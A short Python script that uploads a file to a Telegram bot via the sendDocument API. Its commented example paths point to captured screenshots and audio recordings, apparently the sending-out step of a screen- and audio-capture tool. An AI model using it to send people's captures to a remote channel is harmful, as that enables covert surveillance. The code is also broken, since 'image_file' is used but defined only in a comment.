import requests
import os

def send_document(document_path, chat_id, token):
    Durl = "https://api.telegram.org/bot{}/sendDocument".format(token)

    with open(document_path, 'rb' ) as f:
        params = {'chat_id': chat_id}
        files = {'document': f}
        response = requests.post(Durl, params=params, files=files)

    print(response.status_code, response.reason)

# example paths
# wave_output_filename = os.path.join(os.path.expanduser("~/Desktop/screenshots"), "recording.wav")
#image_file = os.path.join(os.path.expanduser("~/Desktop/screenshots"), "cap.jpg")

cid = "your_chat_id"
tok = "your_token_id"
send_document(image_file, cid, tok)